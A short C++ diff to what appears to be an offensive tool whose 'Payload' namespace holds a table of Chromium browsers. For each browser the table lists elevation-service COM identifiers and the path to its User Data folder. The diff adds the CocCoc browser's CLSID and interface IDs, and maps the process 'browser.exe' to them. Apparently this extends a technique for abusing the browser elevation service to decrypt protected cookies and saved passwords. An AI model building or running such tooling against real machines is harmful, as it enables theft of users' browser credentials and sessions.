@@ -58,7 +58,12 @@ namespace Payload {
                 {0xEAD34EE8, 0x8D08, 0x4CA1, {0xAD, 0xA3, 0x64, 0x75, 0x43, 0x74, 0xD8, 0x11}},  // CLSID
                 {0x7737BB9F, 0xBAC1, 0x4C71, {0xA6, 0x96, 0x7C, 0x82, 0xD7, 0x99, 0x4B, 0x6F}},  // IElevatorChrome IID (Avast uses this, not base IElevator)
                 std::nullopt,  // No IElevator2 for Avast
-                localApp / "AVAST Software" / "Browser" / "User Data"}}
+                localApp / "AVAST Software" / "Browser" / "User Data"}},
+            {"coccoc", {"CocCoc", L"browser.exe",
+                {0x77358251, 0x489E, 0x46F6, {0xAA, 0xD6, 0x1D, 0x41, 0xB8, 0x9F, 0xEF, 0x01}},  // CLSID
+                {0x0E9BCC98, 0x8138, 0x417A, {0x83, 0xC3, 0x4D, 0x4A, 0xAF, 0xED, 0x63, 0x16}},  // IElevatorCocCoc (v1)
+                IID{0x7E26AA1D, 0x1A19, 0x4538, {0x97, 0x80, 0xD0, 0xB6, 0xA1, 0xA6, 0x93, 0xE5}},  // IElevator2CocCoc (v2)
+                localApp / "CocCoc" / "Browser" / "User Data"}}
         };
     }
 
@@ -72,6 +77,7 @@ namespace Payload {
         if (exe == "brave.exe") return GetConfigs().at("brave");
         if (exe == "msedge.exe") return GetConfigs().at("edge");
         if (exe == "avastbrowser.exe") return GetConfigs().at("avast");
+        if (exe == "browser.exe") return GetConfigs().at("coccoc");
 
         throw std::runtime_error("Unknown browser process");
     }
